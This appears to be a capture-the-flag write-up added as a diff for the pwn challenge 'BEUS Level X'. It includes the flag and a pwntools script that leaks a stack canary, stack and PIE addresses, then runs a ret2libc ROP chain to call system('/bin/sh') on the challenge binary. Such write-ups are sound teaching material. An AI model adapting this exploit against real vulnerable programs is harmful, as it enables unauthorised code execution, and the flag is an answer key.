@@ -1,0 +1,108 @@
+# PWN - BEUS Level X
+**Author** : Lazar Mancic  
+**Difficulty**: <font color='lightgreen'>Easy</font>  
+**Description**: The Binary Exploitation Unit of Serbia has prepared another level of their test for you, and it feels very familiar.
+
+**Flag**: ``SCC{r37urn1n6_70_l1bc_15_345y_50lv3}``
+
+# Writeup
+
+## Solution
+```py
+from pwn import *
+
+HOST = args.HOST or "localhost"
+PORT = int(args.PORT or "1337")
+FLAG = args.FLAG
+
+context.log_level = 'ERROR'
+
+if args.REMOTE:
+    p = remote(HOST, PORT)
+else:
+    p = process("./beusX", env={"FLAG": FLAG})
+elf = context.binary = ELF("./beusX")
+libc = ELF("./libc-2.31.so")
+
+anss = [b"dynamic\0", b"libc\0", b"got\0", b"stack canary\0", b"rop\0"]
+
+payload = b"A" * 137
+p.sendafter(b"Answer> ", payload)
+
+p.recvuntil(payload)
+canary = u64(b"\0" + p.recv(7))
+rbp_leak = u64(p.recv(6) + b"\x00\x00")
+p.sendlineafter(b"]> ", b"n")
+
+log.success(f"Canary leak : {canary:#x}")
+log.success(f"Stack leak : {rbp_leak:#x}")
+
+payload = b"A" * 152
+p.sendafter(b"Answer> ", payload)
+
+p.recvuntil(payload)
+pie_leak = u64(p.recv(6) + b"\x00\x00") - 0x1364
+p.sendlineafter(b"]> ", b"n")
+
+log.success(f"PIE leak : {pie_leak:#x}")
+elf.address = pie_leak
+
+anss[0] = flat(
+    anss[0],
+    b"A" * (136 - len(anss[0])),
+    canary,
+    rbp_leak
+)
+
+for ans in anss:
+    p.sendafter(b"Answer> ", ans)
+    p.sendlineafter(b"]> ", b"y")
+
+pop_rdi = pie_leak + 0x145b
+ret = pie_leak + 0x1016
+
+payload = flat(
+    b"A" * 136,
+    canary,
+    b"A" * 8,
+    pop_rdi,
+    elf.got.puts,
+    elf.plt.puts,
+    elf.sym.main
+)
+
+p.sendlineafter(b"comment> ", payload)
+
+p.recvline()
+libc_leak = u64(p.recv(6) + b"\x00\x00") - libc.sym.puts
+
+log.success(f"Libc leak : {libc_leak:#x}")
+libc.address = libc_leak
+
+anss[0] = b'dynamic\0'
+for ans in anss:
+    p.sendafter(b"Answer> ", ans)
+    p.sendlineafter(b"]> ", b"y")
+
+binsh = next(libc.search(b"/bin/sh\x00"))
+
+payload = flat(
+    b"A" * 136,
+    canary,
+    b"A" * 8,
+    pop_rdi,
+    binsh,
+    libc.sym.system
+)
+
+p.sendlineafter(b"comment> ", payload)
+
+p.recvline()
+p.sendline(b"cat flag")
+
+flag = p.recvline(False).decode()
+
+print(flag)
+p.close()
+
+```
